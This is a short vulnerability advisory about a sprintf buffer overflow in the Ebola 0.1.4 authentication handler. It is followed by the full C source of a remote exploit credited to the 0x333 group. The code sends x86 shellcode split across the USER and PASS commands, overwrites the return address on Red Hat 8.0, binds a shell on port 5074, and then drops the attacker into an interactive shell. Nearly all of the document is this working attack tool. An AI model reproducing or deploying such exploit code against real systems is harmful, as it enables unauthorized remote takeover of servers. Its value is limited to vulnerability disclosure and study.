source: http://www.securityfocus.com/bid/9156/info

It has been reported that a buffer overflow condition is present in the authentication mechanism implemented in Ebola. The condition is due to the use of the C library function sprintf() to construct an error message when authentication is not successful. According to the discoverer of this flaw, the vulnerability is remotely exploitable. 

/* 0x333ebola.c => ebola 0.1.4 remote exploit
 *
 *   [-3-] __ OUTSIDERS VIRTUAL SECURITY LABS __ [-3-]
 *
 *    Ebola 0.1.4 remote stack overflow exploit,
 *    bug found by "Secure Network Operations".
 *
 *    Here the bugged code :
 *
 *    [...]
 *    int handle_PASS( int ssocket, char *sentline ){
 *
 *      char *passwd;
 *      char outstr[100];
 *
 *    [...]
 *         else {
 *            sprintf(outstr,"PASS NOT ACCEPTED for user \"%s\", pass \"%s\".\n",username,passwd);
 *            write(ssocket,outstr,strlen(outstr));
 *            sleep(_BAD_PASS_SLEEP_TIME);
 *        }
 *    [...]
 *
 *    Technical details :
 *
 *    - system   : Red Hat Linux 8.0
 *    - package  : ebola-0.1.4.tar.gz (from : http://pldaniels.com/ebola/)
 *    - requires : libsavi (libsavi.so.3.2.07.031) (from http://www.sophos.com)
 *
 *   Note : the exploit is unstable.
 *
 *  coded by c0wboy
 *
 * (c) 0x333 Outsider Security Labs 2003 / www.0x333.org
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define EBOLA     1665
#define SHELL     5074
#define MAX_TG    2

int fdsocket, debug = 0x0;
struct sockaddr_in anger;
struct hostent * cya;


struct {

	char *os;     /* system os */
	char *descpr; /* ebola infos */
	int ret;      /* return address */
	int align;    /* align the buffer */

} ebola[] = {

	{ "RedHat 8.0 (Psyche)", "ebola-0.1.4.tar.gz", 0xbfffea1c, 3 },
	{ "Generic Linux Test ", "generic ebola!", 0x41414141, 0x0 },
	{ "exploit code", "outsiders security labs", 0x333, 0x333 },

};


unsigned char shellcode_1[] = 
	"\x90\x90\x90\x90\x31\xc0\x50\x40\x89\xc3\x50\x40\x50"
	"\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x13\xd2"
	"\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66"
	"\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80"
	"\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1"
	"\xb0\x3f\xcd\x80\xeb\x36";

unsigned char shellcode_2[] =
	"\x90\x90\x90\x90\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e"
	"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
	"\xe1\xb0\x0b\xcd\x80";


void list(void);
void banner(void);
void usage(char *);
void warning(char *);
int ebol4(char *, int, int, int);
int connection(char *, int);
int owned(int);


void list (void)
{
	int i;

	fprintf (stderr, "\n _(0x0)_ targets _(0x0)_\n");
	fprintf (stderr, " ----------------------- \n");

	for (i=0; ebola[i].ret != 0x333; i++)
		fprintf (stderr, " _(%d)_ %s [%s]\n", i, ebola[i].os, ebola[i].descpr);
	fprintf (stderr, "\n");

	exit(EXIT_FAILURE);
}


void banner (void)
{
	fprintf (stdout, "\n   ---     0x333ebola => ebola-0.1.4 remote exploit     ---\n");
	fprintf (stdout, "     ---        Outsiders Se(c)urity Labs 2003        ---\n\n");
}


void usage (char *prg)
{
	banner();

	fprintf (stderr, " Usage : %s [-d hostname] [-p port] [-t target] [-l] [-V] [-h]\n\n", prg);
	fprintf (stderr, "\t-d :\thost to attack\n");
	fprintf (stderr, "\t-p :\tebola's port (default %d)\n", EBOLA);
	fprintf (stderr, "\t-t :\tselect a target\n");
	fprintf (stderr, "\t-l :\tlist targets\n");
	fprintf (stderr, "\t-V :\tdebug mode\n");
	fprintf (stderr, "\t-h :\tdisplay this help\n\n");
 
	exit (EXIT_FAILURE);
}


void warning (char *error)
{
	fprintf (stderr, "%s", error);
	close (fdsocket);

	exit (EXIT_FAILURE);
}


int ebol4 (char *target, int port, int ret, int align)
{
	int i;
	char snd[1024]="", rcv[1024]="";
	char buf1[92], buf2[101];

	int *ebol = (int *)(buf2 + align);

	if (connection(target, port)) /* connect to server */
		warning ("\n _(0x666)_  Error in connecting to server\n");
	else
		fprintf (stdout, " _(0x1)_  Connected (!)\n");

	/* create buffer */
	memset ((char *)buf1, 0x90, sizeof(buf1));
	memcpy ((char *)buf1, shellcode_1, strlen(shellcode_1));

	memset ((char *)buf2, 0x90, sizeof(buf2));
	for (i=0; i<15; i+=4, *ebol++ = ret);

	memcpy ((char *)buf2+15+12, shellcode_2, strlen(shellcode_2));

	recv (fdsocket, rcv, sizeof(rcv), 0x0);

	if (debug)
		fprintf (stdout, "\n <debug> server resp. : %s\n", rcv);

	fprintf (stdout, " _(0x2)_  Sending USER (shellcode_1)\n");

	sprintf (snd, "USER %s\n", buf1);
	write (fdsocket, snd, strlen(snd));
	recv (fdsocket, rcv, sizeof(rcv), 0x0);

	if (debug)
	{
		fprintf (stdout, " <debug> [w8ing ...] run gdb then press [ENTER]\n");
		getchar();
	}

	fprintf (stdout, " _(0x3)_  Sending PASS (shellcode_2)\n\n");

	sprintf (snd, "PASS %s\n", buf2);
	write (fdsocket, snd, strlen(snd));
	recv (fdsocket, rcv, sizeof(rcv), 0x0);

	if (debug)
		fprintf (stdout, " <debug> server resp. : %s\n", rcv);

	close (fdsocket);

	if (!(connection(target, SHELL)))
		owned(fdsocket);
	else
		return 0x666;

	return 0x333;
}

int connection (char *target, int port)
{
	anger.sin_family = AF_INET;
	anger.sin_port = htons(port);
	cya = gethostbyname(target);

	if (cya==0x0)
		return 0x1;
	else
	{
		bcopy (cya->h_addr, &anger.sin_addr, cya->h_length);

		if ((fdsocket = socket (AF_INET, SOCK_STREAM, 0x0)) < 0x0)
			return 0x1;
		else
			if ((connect (fdsocket, (struct sockaddr*)&anger, sizeof(anger))) < 0x0)
				return 0x1;
	}

	return 0x0;
}


int owned (int fdsocket)
{
	int i;
	fd_set hate;
	char outside[1024];
	char *cmd="uname -a;id;\n\n";

	FD_ZERO (&hate);
	FD_SET (fdsocket, &hate);
	FD_SET (0, &hate);

	fprintf (stdout, " (======owned======) (======owned======) (======owned======)\n\n");
	send (fdsocket, cmd, strlen(cmd), 0x0);

	for(;;)
	{
		FD_SET (fdsocket, &hate);
		FD_SET (0, &hate);

		if (select(FD_SETSIZE, &hate, NULL, NULL, NULL) < 0x0)
			break;

		if (FD_ISSET(fdsocket, &hate))
		{
			if ((i = recv(fdsocket, outside, sizeof(outside)-1, 0x0)) < 0x0)
				warning (" _(0x333)_  cya hax0r\n");

			if (write(1, outside, i) < 0x0)
				break;
		}

		if (FD_ISSET(0x0, &hate))
		{
			if ((i = read(0x0, outside, sizeof (outside)-1)) < 0x0)
				warning(" _(0x333)_  cya hax0r\n");

			if (send(fdsocket, outside, i, 0x0) < 0x0)
				break;
		}

		usleep(10);
	}

	fprintf (stderr, " _(0x333)_ cya hax0r\n");
	return 0;
}


int main (int argc, char **argv)
{
	int c, i = -1, port = EBOLA; 
	char *target =NULL;
	
	while ((c = getopt(argc, argv, "hVlt:d:p:")) != EOF)
	{
		switch (c)
		{
			case 'p' : port = atoi(optarg); break;
			case 'd' : target = optarg; break;

			case 't' :
				   i = atoi(optarg);
				   if (i<0 || i>MAX_TG-1)
					   usage(argv[0]);
				   break;

			case 'l' : list(); break;
			case 'V' : debug = 0x1; break;

			case 'h' :
			default  : usage(argv[0]);
		}
	}

	if (target == NULL || i == -1)
		usage(argv[0]);

	banner();

	fprintf (stdout, " _(0x0)_  Exploiting <%s:%d> on %s\n", target, port, ebola[i].os);
	
	if ((ebol4(target, port, ebola[i].ret, ebola[i].align)) == 0x333)
		return 0;
	else
		warning ("\n _(0x666)_  Exploitation Failed !\n\n");
}